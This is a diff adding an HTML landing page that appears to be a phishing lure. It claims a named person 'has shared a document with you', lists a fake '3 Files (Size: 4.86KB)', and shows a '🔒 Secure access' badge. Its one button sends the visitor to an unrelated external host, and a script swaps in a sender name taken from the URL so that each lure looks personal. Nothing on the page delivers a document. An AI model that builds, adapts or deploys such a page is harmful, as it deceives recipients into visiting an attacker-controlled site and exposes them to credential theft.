@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document Shared</title>
+
+  <!-- ===== OPTIONAL ANALYTICS (Google Analytics example) ===== -->
+  <!--
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXX"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-XXXXXXX');
+  </script>
+  -->
+  <!-- ======================================================== -->
+
+  <style>
+    :root {
+      --bg: #ffffff;
+      --text: #222;
+      --muted: #666;
+      --blue: #1a73e8;
+      --blue-soft: #e8f0fe;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg: #0f1115;
+        --text: #f1f1f1;
+        --muted: #a1a1a1;
+        --blue: #8ab4f8;
+        --blue-soft: #1a2a44;
+      }
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+        Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: var(--bg);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      text-align: center;
+      max-width: 420px;
+      padding: 20px;
+      animation: fadeIn 0.8s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .icon {
+      width: 110px;
+      height: 110px;
+      margin: 0 auto 24px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    p {
+      font-size: 15px;
+      color: var(--muted);
+      margin-bottom: 28px;
+    }
+
+    .btn {
+      display: inline-block;
+      text-decoration: none;
+      color: var(--blue);
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      transition: opacity 0.2s ease;
+    }
+
+    .btn:hover {
+      opacity: 0.75;
+    }
+
+    .secure {
+      margin-top: 14px;
+      font-size: 12px;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    /* Tighter mobile spacing */
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 22px;
+      }
+
+      p {
+        margin-bottom: 22px;
+      }
+
+      .icon {
+        width: 95px;
+        height: 95px;
+        margin-bottom: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Icon -->
+    <svg class="icon" viewBox="0 0 120 120">
+      <circle cx="60" cy="60" r="54" fill="var(--blue-soft)"/>
+      <path d="M40 62l12 12 28-30"
+        fill="none"
+        stroke="var(--blue)"
+        stroke-width="6"
+        stroke-linecap="round"
+        stroke-linejoin="round"/>
+    </svg>
+
+    <!-- Content -->
+    <h1>
+      <strong id="username">Arboreal</strong> has shared a document with you
+    </h1>
+
+    <p>3 Files (Size: 4.86KB)</p>
+
+    <!-- CTA -->
+    <a
+      class="btn"
+      href="https://mistral.troosidri.app/QjZiHG@T/"
+      onclick="trackClick()"
+    >
+      Proceed to documents
+    </a>
+
+    <!-- Secure micro-text -->
+    <div class="secure">
+      🔒 Secure access
+    </div>
+  </div>
+
+  <script>
+    // ===== URL-based name (?name=John) =====
+    const params = new URLSearchParams(window.location.search);
+    const name = params.get("name");
+    if (name) {
+      document.getElementById("username").textContent = name;
+    }
+
+    // ===== Tracking hook =====
+    function trackClick() {
+      console.log("Proceed clicked");
+
+      // Example for GA:
+      // gtag('event', 'proceed_click', {
+      //   event_category: 'CTA',
+      //   event_label: 'Proceed to documents'
+      // });
+    }
+  </script>
+
+</body>
+</html>
